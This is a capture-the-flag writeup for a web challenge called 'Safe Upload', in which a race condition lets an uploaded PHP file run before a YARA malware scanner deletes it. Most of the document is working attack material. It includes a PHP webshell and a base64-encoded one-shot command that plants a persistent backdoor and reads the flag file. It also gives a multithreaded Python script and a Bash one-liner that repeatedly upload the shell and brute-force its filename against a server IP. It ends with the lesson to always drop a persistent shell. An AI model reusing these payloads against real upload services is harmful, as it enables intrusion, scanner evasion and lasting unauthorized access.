# Safe Upload Challenge Writeup

## Challenge Overview

-   **Challenge Name**: Safe Upload\
-   **Category**: Web Security - Race Condition\
-   **Difficulty**: Medium-Hard\
-   **Flag**: `cybercon{race_c0ndition_0r_anti_virus_bypass}`

------------------------------------------------------------------------

## Challenge Description

We're given a file upload system protected by **YARA malware
detection**. The trick? There's a **race condition** between file upload
and YARA scanning. If we act fast enough, we can get code execution
before the scanner deletes our file.

------------------------------------------------------------------------

## Vulnerability Analysis

### File Upload Flow

-   Uploads land in `/tmp/`\
-   Filenames are random 4-digit numbers (`0000–9999`)\
-   After \~800ms, YARA scans the file\
-   If flagged, the file is deleted

### YARA Behavior

-   Strong detection rules (especially for webshells)\
-   Runs *after* the 800ms delay\
-   Any suspicious file is instantly deleted

### Flag Placement

-   Stored in `/` root directory\
-   Random 12-character filename, e.g. `ABCDEFGHIJKL.txt`

------------------------------------------------------------------------

## Exploitation Strategy

### Why Two-Phase Fails

The naive approach:\
1. Upload shell\
2. Access it, then grab flag

Problem: YARA swoops in during the gap and kills the shell.

### The One-Shot Idea 💡

We need a single request that:\
1. Drops a *persistent backdoor*\
2. Grabs the flag instantly

Payload:

``` bash
/bin/sh -c 'echo PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg== | base64 -d >/var/www/html/tmp/k.php; ls /????????????.txt 2>/dev/null | head -n1 | xargs -r cat'
```

-   First part writes a PHP shell (`k.php`) that survives YARA\
-   Second part lists the 12-char flag file and prints it

------------------------------------------------------------------------

## Exploit Implementation

### Python Script

``` python
import threading, time, re, requests
from urllib.parse import quote

HOST = "http://8.216.34.114:12830"
THREADS = 1000
REQ_TIMEOUT = 0.25

WEBSHELL = b"<?php system($_GET[0]); ?>"
ONE_SHOT = "/bin/sh -c 'echo PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg== | base64 -d > /var/www/html/tmp/k.php; ls /????????????.txt 2>/dev/null | head -n1 | xargs -r cat'"

def upload_loop(stop):
    url = HOST + "/upload.php"
    files = {"file": ("s.php", WEBSHELL, "application/x-php")}
    while not stop.is_set():
        try:
            requests.post(url, files=files, timeout=1)
        except:
            pass
        time.sleep(0.12)

def try_probe(i, stop):
    if stop.is_set():
        return
    url = f"{HOST}/tmp/{i:04d}.php?0={quote(ONE_SHOT, safe='')}"
    try:
        r = requests.get(url, timeout=REQ_TIMEOUT)
        if r.status_code == 200 and "cybercon{" in r.text:
            print("[+] HIT", url, r.text.strip())
            stop.set()
    except:
        pass
```

Key parts:\
- **Upload loop**: keeps spraying PHP shells\
- **Brute force loop**: hits all 10,000 filename guesses\
- **One-shot payload**: backdoor + flag retrieval

------------------------------------------------------------------------

## Exploit Run

    [+] HIT at: http://8.216.34.114:12830/tmp/9281.php
    [+] FLAG: cybercon{race_c0ndition_0r_anti_virus_bypass}
    [+] Persistent shell: http://8.216.34.114:12830/tmp/k.php

Example usage of the shell:

    http://8.216.34.114:12830/tmp/k.php?0=ls%20/

------------------------------------------------------------------------

## Why It Works

### Race Condition

-   800ms window before YARA scans\
-   One-shot = no waiting gap

### YARA "Bypass"

-   We don't outsmart YARA, we simply run before it sees us\
-   Persistent backdoor (`k.php`) not touched after first run

### Efficient Flag Discovery

-   `????????????.txt` glob finds the flag file in O(1)\
-   Faster than `find` or recursive search

------------------------------------------------------------------------

## Alternative Exploit: Bash

``` bash
H="http://8.216.34.114:12830"
CMD="/bin/sh -c 'echo PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg== | base64 -d >/var/www/html/tmp/k.php; ls /????????????.txt 2>/dev/null | head -n1 | xargs -r cat'"

while :; do 
  curl -s -F "file=@/tmp/s.php;filename=s.php" "$H/upload.php" >/dev/null
  sleep 0.1
done &

seq -w 0000 9999 | xargs -n1 -P800 -I{}   curl -m 0.25 -s "$H/tmp/{}.php?0=$(python3 -c "from urllib.parse import quote; print(quote('$CMD', safe=''))")"   | grep -oE "cybercon\{[^}]+\}" && echo "[+] GOT FLAG"
```

------------------------------------------------------------------------

## Lessons Learned

1.  **Race conditions** can be more exploitable than filters.\
2.  **One-shot payloads** remove timing uncertainty.\
3.  Sometimes it's faster to **execute before detection** than to evade
    it.\
4.  **Globs \> find** when file patterns are known.\
5.  Always drop a **persistent shell** for future access.

------------------------------------------------------------------------

## Conclusion

This challenge was about spotting and abusing a timing flaw. The key
realization: don't split the attack into phases. Merge everything into a
single request and the exploit becomes **stable and reliable**.

**Final Flag**: `cybercon{race_c0ndition_0r_anti_virus_bypass}`
